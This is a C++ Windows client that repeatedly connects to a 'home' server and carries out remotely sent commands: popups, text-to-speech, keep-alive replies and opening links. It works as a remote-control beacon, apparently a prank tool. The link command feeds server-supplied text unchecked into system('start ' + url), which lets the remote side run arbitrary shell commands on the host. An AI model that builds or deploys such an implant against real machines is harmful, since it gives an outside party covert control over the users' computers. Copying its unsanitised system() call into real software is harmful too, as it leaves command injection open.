#include "ip.h"
#include "../../packet.h"
#include <iostream>
#include <asio.hpp>
#include <string>
#include <thread>
#include <windows.h>
#include <sapi.h>

using asio::ip::tcp;


void show_popup(const char* message) {
    MessageBoxA(NULL, message, "Popup", MB_OK | MB_ICONINFORMATION);
}
int main() {
    while(true) {
        std::cout << "trying to connect to home\n";
        try {
            asio::io_context io_context;

            tcp::resolver resolver(io_context);
            auto endpoints = resolver.resolve(ip, "1234");

            tcp::socket socket(io_context);
            asio::connect(socket, endpoints);
            std::cout << "connect to home yayayayayayayayyayay\n";

            while (true) {
                Packet packet;
                std::size_t len = asio::read(socket, asio::buffer(&packet, sizeof(Packet)));

                // Check that we read the full packet
                if (len == sizeof(Packet)) {
                    switch (packet.id) {
                        case GET_DATA:
                            // Offload to a separate thread
                            std::thread([&socket, packet]() {
                                if (packet.id == packet_id::GET_DATA) {
                                    Packet alive_packet{};
                                    alive_packet.id = packet_id::GET_DATA;
                                    alive_packet.number = 1;
                                    asio::write(socket, asio::buffer(&alive_packet, sizeof(alive_packet)));
                                }
                            }).detach();                       
                            break;
                        case POPUP:
                            show_popup(packet.str);
                            break;
                        case OPEN_LINK: {
                                std::string url = std::string(packet.str);
                                std::string command = "start " + url;
                                system(command.c_str());
                                break;
                            }
                        case TTS: {
                           ISpVoice* pVoice = nullptr;

                            if (FAILED(::CoInitialize(NULL))) {
                                std::cerr << "Failed to initialize COM\n";
                                return 1;
                            }

                            HRESULT hr = CoCreateInstance(CLSID_SpVoice, NULL, CLSCTX_ALL, IID_ISpVoice, (void**)&pVoice);
                            if (SUCCEEDED(hr)) {
                                wchar_t wmsg[256];
                                MultiByteToWideChar(CP_UTF8, 0, packet.str, -1, wmsg, 256);
                                pVoice->Speak(wmsg, 0, NULL);
                                pVoice->Release();
                            } else {
                                std::cerr << "Failed to create SAPI voice\n";
                            }

                            ::CoUninitialize();                            
                    }
                            break;
                        default:
                            break;
                    }
                } else {
                    std::cerr << "Error: Incomplete packet received." << std::endl;
                }
            }

        } catch (std::exception& e) {
            std::cout << "failed to connect to home \n";
            std::cerr << "Exception: " << e.what() << "\n";
        }
    }
    return 0;
}
